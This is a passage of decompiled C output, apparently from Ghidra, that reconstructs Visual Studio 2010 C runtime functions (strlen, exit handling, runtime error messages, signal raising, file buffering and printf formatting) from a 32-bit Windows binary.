      piVar2 = __errno();
      eStack_10 = 0x22;
      *piVar2 = 0x22;
      goto LAB_00408047;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eStack_10 = 0x16;
  *piVar2 = 0x16;
LAB_00408047:
  FUN_004087f3();
  return eStack_10;
}



/* Function: _strlen */

/* Library Function - Single Match
    _strlen
   
   Library: Visual Studio */

size_t __cdecl _strlen(char *_Str)

{
  uint uVar1;
  uint *puVar2;
  uint *puVar3;
  
  uVar1 = (uint)_Str & 3;
  puVar2 = (uint *)_Str;
  while (uVar1 != 0) {
    uVar1 = *puVar2;
    puVar2 = (uint *)((int)puVar2 + 1);
    if ((char)uVar1 == '\0') goto LAB_004080f3;
    uVar1 = (uint)puVar2 & 3;
  }
  do {
    do {
      puVar3 = puVar2;
      puVar2 = puVar3 + 1;
    } while (((*puVar3 ^ 0xffffffff ^ *puVar3 + 0x7efefeff) & 0x81010100) == 0);
    uVar1 = *puVar3;
    if ((char)uVar1 == '\0') {
      return (int)puVar3 - (int)_Str;
    }
    if ((char)(uVar1 >> 8) == '\0') {
      return (size_t)((int)puVar3 + (1 - (int)_Str));
    }
    if ((uVar1 & 0xff0000) == 0) {
      return (size_t)((int)puVar3 + (2 - (int)_Str));
    }
  } while ((uVar1 & 0xff000000) != 0);
LAB_004080f3:
  return (size_t)((int)puVar2 + (-1 - (int)_Str));
}



/* Function: __heap_init */

/* Library Function - Single Match
    __heap_init
   
   Library: Visual Studio 2010 Release */

int __cdecl __heap_init(void)

{
  DAT_0041aeb8 = HeapCreate(0,0x1000,0);
  return (uint)(DAT_0041aeb8 != (HANDLE)0x0);
}



/* Function: ___crtCorExitProcess */

/* Library Function - Single Match
    ___crtCorExitProcess
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl ___crtCorExitProcess(int param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(L"mscoree.dll");
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,"CorExitProcess");
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



/* Function: ___crtExitProcess */

/* Library Function - Single Match
    ___crtExitProcess
   
   Library: Visual Studio 2010 Release */

void __cdecl ___crtExitProcess(int param_1)

{
  ___crtCorExitProcess(param_1);
                    /* WARNING: Subroutine does not return */
  ExitProcess(param_1);
}



/* Function: FUN_0040817c */

void FUN_0040817c(void)

{
  __lock(8);
  return;
}



/* Function: FUN_00408185 */

void FUN_00408185(void)

{
  FUN_0040c0a7(8);
  return;
}



/* Function: __init_pointers */

/* Library Function - Single Match
    __init_pointers
   
   Library: Visual Studio 2010 Release */

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00409846();
  FUN_00408632(uVar1);
  FUN_00408669(uVar1);
  FUN_0040a17e(uVar1);
  FUN_0040c3a7(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_0040c396();
  return;
}



/* Function: __initterm_e */

/* Library Function - Single Match
    __initterm_e
   
   Library: Visual Studio 2010 Release */

void __cdecl __initterm_e(undefined4 *param_1,undefined4 *param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = param_1 + 1;
  }
  return;
}



/* Function: __cinit */

/* Library Function - Single Match
    __cinit
   
   Library: Visual Studio 2010 Release */

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  undefined4 *puVar3;
  
  if ((PTR___fpmath_00415ffc != (undefined *)0x0) &&
     (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&PTR___fpmath_00415ffc), BVar1 != 0)) {
    (*(code *)PTR___fpmath_00415ffc)(param_1);
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined4 *)&DAT_00415238,(undefined4 *)&DAT_00415254);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_0040b561);
    puVar3 = &DAT_00415220;
    do {
      if ((code *)*puVar3 != (code *)0x0) {
        (*(code *)*puVar3)();
      }
      puVar3 = puVar3 + 1;
    } while (puVar3 < &DAT_00415234);
    if ((DAT_0041ebd0 != (code *)0x0) &&
       (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_0041ebd0), BVar1 != 0)) {
      (*DAT_0041ebd0)(0,2,0);
    }
    iVar2 = 0;
  }
  return iVar2;
}



/* Function: doexit */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* WARNING: Removing unreachable block (ram,0x004083ad) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    _doexit
   
   Library: Visual Studio 2010 Release */

void __cdecl doexit(int param_1,int param_2,int param_3)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  code *pcVar4;
  int *piVar5;
  int *piVar6;
  int *local_34;
  int *local_2c;
  int *local_28;
  undefined4 *local_24;
  undefined4 *local_20;
  
  __lock(8);
  if (DAT_0041aeec != 1) {
    _DAT_0041aee8 = 1;
    DAT_0041aee4 = (undefined1)param_3;
    if (param_2 == 0) {
      piVar1 = (int *)DecodePointer(DAT_0041ebc8);
      if (piVar1 != (int *)0x0) {
        piVar2 = (int *)DecodePointer(DAT_0041ebc4);
        local_34 = piVar1;
        local_2c = piVar2;
        local_28 = piVar1;
        while (piVar2 = piVar2 + -1, piVar1 <= piVar2) {
          iVar3 = FUN_00409846();
          if (*piVar2 != iVar3) {
            if (piVar2 < piVar1) break;
            pcVar4 = (code *)DecodePointer((PVOID)*piVar2);
            iVar3 = FUN_00409846();
            *piVar2 = iVar3;
            (*pcVar4)();
            piVar5 = (int *)DecodePointer(DAT_0041ebc8);
            piVar6 = (int *)DecodePointer(DAT_0041ebc4);
            if ((local_28 != piVar5) || (piVar1 = local_34, local_2c != piVar6)) {
              piVar1 = piVar5;
              piVar2 = piVar6;
              local_34 = piVar5;
              local_2c = piVar6;
              local_28 = piVar5;
            }
          }
        }
      }
      for (local_20 = &DAT_00415258; local_20 < &DAT_00415264; local_20 = local_20 + 1) {
        if ((code *)*local_20 != (code *)0x0) {
          (*(code *)*local_20)();
        }
      }
    }
    for (local_24 = &DAT_00415268; local_24 < &DAT_0041526c; local_24 = local_24 + 1) {
      if ((code *)*local_24 != (code *)0x0) {
        (*(code *)*local_24)();
      }
    }
  }
  FUN_004083a7();
  if (param_3 == 0) {
    DAT_0041aeec = 1;
    FUN_0040c0a7(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



/* Function: FUN_004083a7 */

void FUN_004083a7(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_0040c0a7(8);
  }
  return;
}



/* Function: _exit */

/* Library Function - Single Match
    _exit
   
   Library: Visual Studio 2010 Release */

void __cdecl _exit(int _Code)

{
  doexit(_Code,0,0);
  return;
}



/* Function: __exit */

/* Library Function - Single Match
    __exit
   
   Library: Visual Studio 2010 Release */

void __cdecl __exit(int param_1)

{
  doexit(param_1,1,0);
  return;
}



/* Function: __cexit */

/* Library Function - Single Match
    __cexit
   
   Library: Visual Studio 2010 Release */

void __cdecl __cexit(void)

{
  doexit(0,0,1);
  return;
}



/* Function: FUN_004083f7 */

void FUN_004083f7(void)

{
  doexit(0,1,1);
  return;
}



/* Function: __amsg_exit */

/* Library Function - Single Match
    __amsg_exit
   
   Library: Visual Studio 2010 Release */

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  __exit(0xff);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: __GET_RTERRMSG */

/* Library Function - Single Match
    __GET_RTERRMSG
   
   Library: Visual Studio 2010 Release */

wchar_t * __cdecl __GET_RTERRMSG(int param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00415cd0)[uVar1 * 2]) {
      return *(wchar_t **)(&UNK_00415cd4 + uVar1 * 8);
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x16);
  return (wchar_t *)0x0;
}



/* Function: __NMSG_WRITE */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __NMSG_WRITE
   
   Library: Visual Studio 2010 Release */

void __cdecl __NMSG_WRITE(int param_1)

{
  wchar_t *pwVar1;
  int iVar2;
  errno_t eVar3;
  DWORD DVar4;
  size_t sVar5;
  HANDLE hFile;
  uint uVar6;
  wchar_t **lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  wchar_t *local_200;
  char local_1fc [500];
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  pwVar1 = __GET_RTERRMSG(param_1);
  local_200 = pwVar1;
  if (pwVar1 != (wchar_t *)0x0) {
    iVar2 = __set_error_mode(3);
    if ((iVar2 == 1) || ((iVar2 = __set_error_mode(3), iVar2 == 0 && (DAT_004191b0 == 1)))) {
      hFile = GetStdHandle(0xfffffff4);
      if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
        uVar6 = 0;
        do {
          local_1fc[uVar6] = (char)pwVar1[uVar6];
          if (pwVar1[uVar6] == L'\0') break;
          uVar6 = uVar6 + 1;
        } while (uVar6 < 500);
        lpOverlapped = (LPOVERLAPPED)0x0;
        lpNumberOfBytesWritten = &local_200;
        local_1fc[499] = 0;
        sVar5 = _strlen(local_1fc);
        WriteFile(hFile,local_1fc,sVar5,(LPDWORD)lpNumberOfBytesWritten,lpOverlapped);
      }
    }
    else if (param_1 != 0xfc) {
      eVar3 = _wcscpy_s((wchar_t *)&DAT_0041aef0,0x314,L"Runtime Error!\n\nProgram: ");
      if (eVar3 == 0) {
        _DAT_0041b12a = 0;
        DVar4 = GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_0041af22,0x104);
        if ((DVar4 != 0) ||
           (eVar3 = _wcscpy_s((wchar_t *)&DAT_0041af22,0x2fb,L"<program name unknown>"), eVar3 == 0)
           ) {
          sVar5 = _wcslen((wchar_t *)&DAT_0041af22);
          if (0x3c < sVar5 + 1) {
            sVar5 = _wcslen((wchar_t *)&DAT_0041af22);
            eVar3 = _wcsncpy_s((wchar_t *)((int)&DAT_0041aeac + sVar5 * 2),
                               0x2fb - ((int)(sVar5 * 2 + -0x76) >> 1),L"...",3);
            if (eVar3 != 0) goto LAB_0040850f;
          }
          eVar3 = _wcscat_s((wchar_t *)&DAT_0041aef0,0x314,L"\n\n");
          if ((eVar3 == 0) &&
             (eVar3 = _wcscat_s((wchar_t *)&DAT_0041aef0,0x314,local_200), eVar3 == 0)) {
            ___crtMessageBoxW((LPCWSTR)&DAT_0041aef0,L"Microsoft Visual C++ Runtime Library",0x12010
                             );
            goto LAB_004085ea;
          }
        }
      }
LAB_0040850f:
                    /* WARNING: Subroutine does not return */
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
  }
LAB_004085ea:
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: __FF_MSGBANNER */

/* Library Function - Single Match
    __FF_MSGBANNER
   
   Library: Visual Studio 2010 Release */

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_004191b0 != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



/* Function: FUN_00408632 */

void __cdecl FUN_00408632(undefined4 param_1)

{
  DAT_0041b518 = param_1;
  return;
}



/* Function: __callnewh */

/* Library Function - Single Match
    __callnewh
   
   Library: Visual Studio 2010 Release */

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)DecodePointer(DAT_0041b518);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



/* Function: FUN_00408669 */

void __cdecl FUN_00408669(undefined4 param_1)

{
  DAT_0041b520 = param_1;
  return;
}



/* Function: __call_reportfault */

/* Library Function - Single Match
    __call_reportfault
   
   Library: Visual Studio 2010 Release */

void __cdecl __call_reportfault(int nDbgHookCode,DWORD dwExceptionCode,DWORD dwExceptionFlags)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  _EXCEPTION_POINTERS local_32c;
  EXCEPTION_RECORD local_324;
  undefined4 local_2d4;
  
  uVar1 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  if (nDbgHookCode != -1) {
    FUN_0040b622();
  }
  local_324.ExceptionCode = 0;
  _memset(&local_324.ExceptionFlags,0,0x4c);
  local_32c.ExceptionRecord = &local_324;
  local_32c.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_324.ExceptionCode = dwExceptionCode;
  local_324.ExceptionFlags = dwExceptionFlags;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_32c);
  if (((LVar3 == 0) && (BVar2 == 0)) && (nDbgHookCode != -1)) {
    FUN_0040b622();
  }
  __security_check_cookie(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: __invoke_watson */

/* Library Function - Single Match
    __invoke_watson
   
   Library: Visual Studio 2010 Release */

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  HANDLE hProcess;
  UINT uExitCode;
  
  __call_reportfault(2,0xc0000417,1);
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



/* Function: __invalid_parameter */

/* Library Function - Single Match
    __invalid_parameter
   
   Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release */

void __invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                        uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)DecodePointer(DAT_0041b520);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x004087dc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
                    /* WARNING: Subroutine does not return */
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



/* Function: FUN_004087f3 */

void FUN_004087f3(void)

{
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return;
}



/* Function: __initp_misc_winsig */

/* Library Function - Single Match
    __initp_misc_winsig
   
   Library: Visual Studio 2010 Release */

void __cdecl __initp_misc_winsig(undefined4 param_1)

{
  DAT_0041b524 = param_1;
  DAT_0041b528 = param_1;
  DAT_0041b52c = param_1;
  DAT_0041b530 = param_1;
  return;
}



/* Function: siglookup */

/* Library Function - Single Match
    _siglookup
   
   Library: Visual Studio 2010 Release */

uint __cdecl siglookup(uint param_1)

{
  uint uVar1;
  int in_EDX;
  
  uVar1 = param_1;
  do {
    if (*(int *)(uVar1 + 4) == in_EDX) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_00415f9c * 0xc + param_1);
  if ((DAT_00415f9c * 0xc + param_1 <= uVar1) || (*(int *)(uVar1 + 4) != in_EDX)) {
    uVar1 = 0;
  }
  return uVar1;
}



/* Function: FUN_00408858 */

void FUN_00408858(void)

{
  DecodePointer(DAT_0041b52c);
  return;
}



/* Function: _raise */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    _raise
   
   Library: Visual Studio 2010 Release */

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  PVOID Ptr;
  code *pcVar3;
  int _File;
  undefined4 uVar4;
  undefined4 *puVar5;
  _ptiddata p_Var6;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var6 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        puVar5 = &DAT_0041b524;
        Ptr = DAT_0041b524;
        goto LAB_0040890f;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_004088ed;
        if (_SigNum != 8) goto LAB_004088db;
      }
    }
    p_Var6 = __getptd_noexit();
    if (p_Var6 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = siglookup((uint)p_Var6->_pxcptacttab);
    puVar5 = (undefined4 *)(uVar1 + 8);
    pcVar3 = (code *)*puVar5;
  }
  else {
    if (_SigNum == 0xf) {
      puVar5 = &DAT_0041b530;
      Ptr = DAT_0041b530;
    }
    else if (_SigNum == 0x15) {
      puVar5 = &DAT_0041b528;
      Ptr = DAT_0041b528;
    }
    else {
      if (_SigNum != 0x16) {
LAB_004088db:
        piVar2 = __errno();
        *piVar2 = 0x16;
        FUN_004087f3();
        return -1;
      }
LAB_004088ed:
      puVar5 = &DAT_0041b52c;
      Ptr = DAT_0041b52c;
    }
LAB_0040890f:
    local_20 = 1;
    pcVar3 = (code *)DecodePointer(Ptr);
  }
  _File = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    _File = __exit(3);
  }
  if (local_20 != _File) {
    __lock(_File);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var6->_tpxcptinfoptrs;
    p_Var6->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var6->_tfpecode;
      p_Var6->_tfpecode = 0x8c;
      goto LAB_00408973;
    }
  }
  else {
LAB_00408973:
    if (_SigNum == 8) {
      for (local_28 = DAT_00415f90; local_28 < DAT_00415f94 + DAT_00415f90; local_28 = local_28 + 1)
      {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var6->_pxcptacttab) = 0;
      }
      goto LAB_004089ab;
    }
  }
  uVar4 = FUN_00409846();
  *puVar5 = uVar4;
LAB_004089ab:
  FUN_004089cc();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var6->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var6->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var6->_tfpecode = local_34;
  }
  return 0;
}



/* Function: FUN_004089cc */

void FUN_004089cc(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_0040c0a7(0);
  }
  return;
}



/* Function: __flsbuf */

/* Library Function - Single Match
    __flsbuf
   
   Library: Visual Studio 2010 Release */

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined *puVar5;
  int unaff_EDI;
  uint uVar6;
  longlong lVar7;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar6 = _File_00->_flag;
  if ((uVar6 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_00408a2e:
    _File_00->_flag = _File_00->_flag | 0x20;
    return -1;
  }
  if ((uVar6 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_00408a2e;
  }
  if ((uVar6 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar6 & 0x10) == 0) {
      _File_00->_flag = uVar6 | 0x20;
      return -1;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar6 & 0xfffffffe;
  }
  uVar6 = _File_00->_flag;
  _File_00->_flag = uVar6 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar6 & 0x10c) == 0) &&
     (((ppuVar3 = FUN_0040d600(), _File_00 != (FILE *)(ppuVar3 + 8) &&
       (ppuVar3 = FUN_0040d600(), _File_00 != (FILE *)(ppuVar3 + 0x10))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((_File_00->_flag & 0x108U) == 0) {
    uVar6 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar6 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar6 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar5 = &DAT_004191d0;
      }
      else {
        puVar5 = (undefined *)(((uint)_File & 0x1f) * 0x40 + (&DAT_0041eac0)[(int)_File >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64((int)_File,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_00408b56;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar6);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar6) {
    return _Ch & 0xff;
  }
LAB_00408b56:
  _File_00->_flag = _File_00->_flag | 0x20;
  return -1;
}



/* Function: _LocaleUpdate */

/* Library Function - Single Match
    public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
   
   Library: Visual Studio 2010 Release */

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_00419e88) && ((p_Var2->_ownlocale & DAT_00419c40) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != PTR_DAT_00419b48) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_00419c40) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



/* Function: write_char */

/* Library Function - Single Match
    _write_char
   
   Library: Visual Studio 2010 Release */

void __cdecl write_char(void)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  FILE *in_ECX;
  int *unaff_ESI;
  
  if (((in_ECX->_flag & 0x40) == 0) || (in_ECX->_base != (char *)0x0)) {
    piVar1 = &in_ECX->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,in_ECX);
    }
    else {
      *in_ECX->_ptr = in_AL;
      in_ECX->_ptr = in_ECX->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



/* Function: write_string */

/* Library Function - Single Match
    _write_string
   
   Library: Visual Studio 2010 Release */

void __cdecl write_string(void)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  int in_ECX;
  int unaff_EDI;
  
  piVar2 = __errno();
  iVar1 = *piVar2;
  if (((*(byte *)(unaff_EDI + 0xc) & 0x40) == 0) || (*(int *)(unaff_EDI + 8) != 0)) {
    piVar2 = __errno();
    *piVar2 = 0;
    while (0 < in_ECX) {
      in_ECX = in_ECX + -1;
      write_char();
      if (*in_EAX == -1) {
        piVar2 = __errno();
        if (*piVar2 != 0x2a) break;
        write_char();
      }
    }
    piVar2 = __errno();
    if (*piVar2 == 0) {
      piVar2 = __errno();
      *piVar2 = iVar1;
    }
  }
  else {
    *in_EAX = *in_EAX + in_ECX;
  }
  return;
}



/* Function: __output_l */

/* WARNING: Type propagation algorithm not settling */
/* Library Function - Single Match
    __output_l
   
   Library: Visual Studio 2010 Release */

int __cdecl __output_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  byte bVar1;
  short *psVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  code *pcVar6;
  errno_t eVar7;
  int iVar8;
  undefined *puVar9;
  int extraout_ECX;
  uint uVar10;
  size_t sVar11;
  wchar_t *pwVar12;
  byte *pbVar13;
  bool bVar14;
  undefined8 uVar15;
  undefined4 *puVar16;
  wchar_t *pwVar17;
  undefined4 uVar18;
  localeinfo_struct *plVar19;
  undefined4 local_27c;
  undefined4 local_278;
  int local_274;
  undefined4 local_270;
  uint local_268;
  int local_264;
  localeinfo_struct local_260;
  int local_258;
  char local_254;
  wchar_t *local_250;
  int local_24c;
  int local_248;
  FILE *local_244;
  byte *local_240;
  int local_23c;
  int local_238;
  int local_234;
  undefined1 local_230;
  char local_22f;
  wchar_t *local_22c;
  int local_228;
  size_t local_224;
  wchar_t *local_220;
  int local_21c;
  byte local_215;
  uint local_214;
  wchar_t local_210 [255];
  undefined2 local_11;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  local_244 = _File;
  local_22c = (wchar_t *)_ArgList;
  local_24c = 0;
  local_214 = 0;
  local_238 = 0;
  local_21c = 0;
  local_234 = 0;
  local_248 = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_260,_Locale);
  if (_File != (FILE *)0x0) {
    if ((_File->_flag & 0x40) == 0) {
      uVar4 = __fileno(_File);
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar9 = &DAT_004191d0;
      }
      else {
        puVar9 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041eac0)[(int)uVar4 >> 5]);
      }
      if ((puVar9[0x24] & 0x7f) == 0) {
        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
          puVar9 = &DAT_004191d0;
        }
        else {
          puVar9 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041eac0)[(int)uVar4 >> 5]);
        }
        if ((puVar9[0x24] & 0x80) == 0) goto LAB_00408d94;
      }
    }
    else {
LAB_00408d94:
      if (_Format != (char *)0x0) {
        local_215 = *_Format;
        local_228 = 0;
        local_224 = 0;
        local_250 = (wchar_t *)0x0;
        iVar8 = 0;
        while ((local_215 != 0 &&
               (pbVar13 = (byte *)_Format + 1, local_240 = pbVar13, -1 < local_228))) {
          if ((byte)(local_215 - 0x20) < 0x59) {
            uVar4 = (int)*(char *)((int)L"Runtime Error!\n\nProgram: " + (char)local_215 + 0x2c) &
                    0xf;
          }
          else {
            uVar4 = 0;
          }
          local_264 = (int)(char)(&DAT_00415e58)[uVar4 * 8 + iVar8] >> 4;
          switch(local_264) {
          case 0:
switchD_00408e09_caseD_0:
            local_23c = 0;
            iVar8 = __isleadbyte_l((uint)local_215,&local_260);
            if (iVar8 != 0) {
              write_char();
              local_240 = (byte *)_Format + 2;
              if (*pbVar13 == 0) goto LAB_00408d05;
            }
            write_char();
            break;
          case 1:
            local_21c = -1;
            local_270 = 0;
            local_248 = 0;
            local_238 = 0;
            local_234 = 0;
            local_214 = 0;
            local_23c = 0;
            break;
          case 2:
            if (local_215 == 0x20) {
              local_214 = local_214 | 2;
            }
            else if (local_215 == 0x23) {
              local_214 = local_214 | 0x80;
            }
            else if (local_215 == 0x2b) {
              local_214 = local_214 | 1;
            }
            else if (local_215 == 0x2d) {
              local_214 = local_214 | 4;
            }
            else if (local_215 == 0x30) {
              local_214 = local_214 | 8;
            }
            break;
          case 3:
            if (local_215 == 0x2a) {
              local_22c = (wchar_t *)((int)_ArgList + 4);
              local_238 = *(int *)_ArgList;
              if (local_238 < 0) {
                local_214 = local_214 | 4;
                local_238 = -local_238;
              }
            }
            else {
              local_238 = local_238 * 10 + -0x30 + (int)(char)local_215;
            }
            break;
          case 4:
            local_21c = 0;
            break;
          case 5:
            if (local_215 == 0x2a) {
              local_22c = (wchar_t *)((int)_ArgList + 4);
              local_21c = *(int *)_ArgList;
              if (local_21c < 0) {
                local_21c = -1;
              }
            }
            else {
              local_21c = local_21c * 10 + -0x30 + (int)(char)local_215;
            }
            break;
          case 6:
            if (local_215 == 0x49) {
              bVar1 = *pbVar13;
              if ((bVar1 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
                local_214 = local_214 | 0x8000;
                local_240 = (byte *)_Format + 3;
              }
              else if ((bVar1 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
                local_214 = local_214 & 0xffff7fff;
                local_240 = (byte *)_Format + 3;
              }
              else if (((((bVar1 != 100) && (bVar1 != 0x69)) && (bVar1 != 0x6f)) &&
                       ((bVar1 != 0x75 && (bVar1 != 0x78)))) && (bVar1 != 0x58)) {
                local_264 = 0;
